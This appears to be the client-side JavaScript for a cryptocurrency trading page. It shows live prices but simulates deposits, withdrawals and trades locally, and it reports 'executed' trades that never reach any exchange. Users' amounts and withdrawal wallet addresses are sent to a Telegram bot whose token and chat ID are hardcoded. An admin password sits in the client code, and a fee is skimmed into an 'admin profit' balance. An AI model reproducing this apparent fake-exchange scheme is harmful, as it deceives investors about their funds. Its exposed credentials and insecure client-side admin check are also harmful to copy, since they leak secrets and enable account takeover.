const BOT_TOKEN = "8995508972:AAGSPih40VfiRDLsor37T5oo7fxMFQqi9Qc"; 
const CHAT_ID = "6504370273";

let currentPrice = 0;
let userBalance = 100.00;
let globalConfig = {
    adminPassword: "Mmooossaa35#",
    feePercent: 0.5,
    adminProfitBalance: 0.00,
    customCoins: [
        { symbol: "XRPUSDT", name: "XRP / USDT" },
        { symbol: "BTCUSDT", name: "BTC / USDT" },
        { symbol: "ETHUSDT", name: "ETH / USDT" },
        { symbol: "SOLUSDT", name: "SOL / USDT" }
    ]
};

function updateBalanceUI() {
    document.getElementById("userBalance").innerText = "$" + userBalance.toFixed(2);
}
updateBalanceUI();

function loadConfig() {
    document.getElementById("adminFeeInput").value = globalConfig.feePercent;
    document.getElementById("adminProfitDisplay").innerText = "$" + globalConfig.adminProfitBalance.toFixed(4) + " USDT";
    
    const select = document.getElementById("tradingPair");
    select.innerHTML = '';
    globalConfig.customCoins.forEach(coin => {
        let opt = document.createElement("option");
        opt.value = coin.symbol;
        opt.innerText = coin.name;
        select.appendChild(opt);
    });
    fetchTicker();
}
loadConfig();

function fetchTicker() {
    const symbol = document.getElementById("tradingPair").value;
    if(!symbol) return;
    fetch('https://api.bitget.com/api/v2/spot/market/tickers?symbol=' + symbol)
        .then(res => res.json())
        .then(data => {
            if(data && data.data && data.data.length > 0) {
                currentPrice = parseFloat(data.data[0].lastPr);
                document.getElementById("livePrice").innerText = '$' + currentPrice.toFixed(4);
            }
        })
        .catch(() => {});
}
setInterval(fetchTicker, 4000);

function calculateTokens() {
    const usdt = parseFloat(document.getElementById("orderSize").value) || 0;
    if(currentPrice > 0) {
        document.getElementById("tokenQuantity").value = (usdt / currentPrice).toFixed(6);
    }
}

function calculateUSDT() {
    const tokens = parseFloat(document.getElementById("tokenQuantity").value) || 0;
    if(currentPrice > 0) {
        document.getElementById("orderSize").value = (tokens * currentPrice).toFixed(2);
    }
}

function openModal(id) { document.getElementById(id).style.display = 'flex'; }
function closeModal(id) { document.getElementById(id).style.display = 'none'; }

function verifyAdminPassword() {
    const pwd = document.getElementById("adminPasswordInput").value;
    if (pwd === globalConfig.adminPassword) {
        closeModal('adminLoginModal');
        openModal('adminModal');
        document.getElementById("adminPasswordInput").value = '';
    } else {
        showToast("❌ Wrong Password!", true);
    }
}

function showToast(msg, isError = false) {
    const t = document.getElementById("toast");
    t.innerText = msg;
    if(isError) t.classList.add("error"); else t.classList.remove("error");
    t.classList.add("show");
    setTimeout(() => t.classList.remove("show"), 3500);
}

function sendToTelegram(text, buttons = []) {
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: "Markdown", reply_markup: { inline_keyboard: buttons } })
    }).catch(() => {});
}

function submitDeposit() {
    const amt = parseFloat(document.getElementById("depAmount").value);
    if(!amt || amt <= 0) { alert("Enter amount"); return; }
    userBalance += amt;
    updateBalanceUI();
    sendToTelegram(`📥 *NEW DEPOSIT REQUEST*\n\n💰 *Amount:* \`${amt} USDT\``, [[{ text: "✅ Approve", callback_data: "dep_app_" + amt }, { text: "❌ Reject", callback_data: "dep_rej_" + amt }]]);
    closeModal('depositModal');
    document.getElementById("depAmount").value = '';
    showToast("✅ Deposit Request Sent!");
}

function submitWithdraw() {
    const amt = parseFloat(document.getElementById("wdAmount").value);
    const addr = document.getElementById("wdAddress").value;
    if(!amt || amt <= 0 || !addr) { alert("Fill fields"); return; }
    if(amt > userBalance) { alert("Low balance"); return; }
    userBalance -= amt;
    updateBalanceUI();
    sendToTelegram(`📤 *WITHDRAWAL REQUEST*\n\n💰 *Amount:* \`${amt} USDT\`\n🔗 *Address:* \`${addr}\``, [[{ text: "✅ Approve", callback_data: "wd_app_" + amt }, { text: "❌ Reject", callback_data: "wd_rej_" + amt }]]);
    closeModal('withdrawModal');
    document.getElementById("wdAmount").value = '';
    document.getElementById("wdAddress").value = '';
    showToast("📤 Withdrawal Request Sent!");
}

function executeOrder(type) {
    const pair = document.getElementById("tradingPair").value;
    const size = parseFloat(document.getElementById("orderSize").value);
    const tokens = document.getElementById("tokenQuantity").value;
    if(!size || size <= 0) { alert("Enter size"); return; }
    if(size > userBalance) { alert("Insufficient balance"); return; }

    const feeAmount = (size * (globalConfig.feePercent / 100));
    globalConfig.adminProfitBalance += feeAmount;
    userBalance -= size;
    updateBalanceUI();

    sendToTelegram(`🚀 *${type} ORDER*\n\n📊 *Pair:* ${pair}\n📦 *USDT:* \`${size}\`\n🪙 *Qty:* \`${tokens}\``, [[{ text: "❌ Close Position", callback_data: "close_" + pair }]]);
    document.getElementById("orderSize").value = '';
    document.getElementById("tokenQuantity").value = '';
    showToast("🚀 Trade Executed Successfully!");
}

function saveAdminSettings() {
    globalConfig.feePercent = parseFloat(document.getElementById("adminFeeInput").value) || 0.5;
    showToast("⚙️ Settings Saved!");
    closeModal('adminModal');
}

function addNewCoin() {
    const symbol = document.getElementById("newCoinSymbol").value.toUpperCase();
    const name = document.getElementById("newCoinName").value;
    if(!symbol || !name) { alert("Enter both"); return; }
    if(!globalConfig.customCoins.some(c => c.symbol === symbol)) {
        globalConfig.customCoins.push({ symbol, name });
        loadConfig();
        showToast("✅ Added " + symbol + "!");
    }
    closeModal('adminModal');
}

function withdrawAdminProfit() {
    globalConfig.adminProfitBalance = 0;
    document.getElementById("adminProfitDisplay").innerText = "$0.0000 USDT";
    showToast("✅ Profit transferred!");
                                                                                            }
